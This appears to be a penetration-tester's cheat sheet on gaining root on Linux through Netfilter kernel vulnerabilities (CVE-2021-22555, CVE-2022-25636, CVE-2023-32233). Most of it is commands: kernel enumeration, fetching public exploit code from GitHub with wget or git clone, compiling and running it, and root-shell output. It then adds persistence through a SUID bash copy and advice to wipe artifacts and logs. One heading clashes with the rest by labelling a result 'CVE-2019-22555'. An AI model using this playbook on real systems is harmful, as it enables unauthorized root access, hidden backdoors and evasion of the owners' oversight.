### 1. Technique Name:

Netfilter Kernel Exploit (Multiple CVEs)
### 2. Summary:

Netfilter is a Linux kernel module responsible for packet filtering, NAT, and firewalling through utilities like `iptables`, `nftables`, and `arptables`. Several critical vulnerabilities discovered between 2021 and 2023 allow local privilege escalation by exploiting flaws in Netfilter subsystems. These vulnerabilities typically affect unpatched or outdated Linux kernel versions and can be used to gain root access by executing precompiled kernel exploit code.
### 3. Conditions / Requirements:

- Local access on the target machine    
- Specific vulnerable kernel version
- Ability to compile and run exploits (requires `gcc`, headers, possibly `libmnl`, `libnftnl`)
- In many cases, the system must allow `unprivileged user namespaces` (usually enabled by default)
### 4. Enumeration Steps:
#### A. Check Kernel Version:

```bash
uname -r
```
#### B. Check for Netfilter-related modules:

```bash
lsmod | grep -i netfilter
modinfo nf_tables
```
#### C. Determine if user namespaces are enabled:

```bash
cat /proc/sys/kernel/unprivileged_userns_clone
```

→ If value is `1`, it's allowed (exploit likely viable)
### 5. Exploitation Steps:
#### A. CVE-2021-22555 – Heap-Based Buffer Overflow (Kernel 2.6 – 5.11)

Steps:

```bash
uname -r          # Check for version <= 5.11
wget https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
gcc -m32 -static exploit.c -o exploit
./exploit
```

Output:

```bash
[+] STAGE 0: Initialization
[*] STAGE 1: Memory corruption
...
# id
uid=0(root) gid=0(root)
```
#### B. CVE-2022-25636 – Heap Out-of-Bounds in `nf_dup_netdev.c` (Kernel 5.4 – 5.6.10)

Steps:

```bash
git clone https://github.com/Bonfee/CVE-2022-25636.git
cd CVE-2022-25636
make
./exploit
```

Warning: Exploit may crash kernel. Use only in test environments.
#### C. CVE-2023-32233 – UAF in `nf_tables` (Kernel ≤ 6.3.1)

Steps:

```bash
git clone https://github.com/Liuk3r/CVE-2023-32233
cd CVE-2023-32233
gcc -Wall -o exploit exploit.c -lmnl -lnftnl
./exploit
```

Output:

```bash
[*] You've Got ROOT:-)
# id
uid=0(root)
```
### 6. Post-Exploitation Tips:

- If persistence is required, drop a SUID shell:    

```bash
cp /bin/bash /tmp/rootsh
chmod +s /tmp/rootsh
```
 
- Confirm kernel stability before further actions
- Clean up: remove exploit artifacts, logs, and binaries    
- Avoid using these techniques on production targets unless explicitly allowed
### 7. Example / Notes:

- Kernel Identification:

```bash
uname -r
# 5.10.5-051005-generic → vulnerable to CVE-2021-22555
```

- CVE-2019-22555 Result:

```bash
./exploit
id
# uid=0(root)
```
 
- Common Failure Causes:
    - Kernel version patched or unsupported    
    - Missing kernel headers/libraries    
    - Crashes due to unstable memory corruption    
- Exploit Sources:
    - [CVE-2021-22555 Exploit](https://github.com/google/security-research/tree/master/pocs/linux/cve-2021-22555)    
    - [CVE-2022-25636 Exploit](https://github.com/Bonfee/CVE-2022-25636)    
    - [CVE-2023-32233 Exploit](https://github.com/Liuk3r/CVE-2023-32233)    
# Tags
> #Linux-Post-Exploitation #Linux-Privesc #Netfilter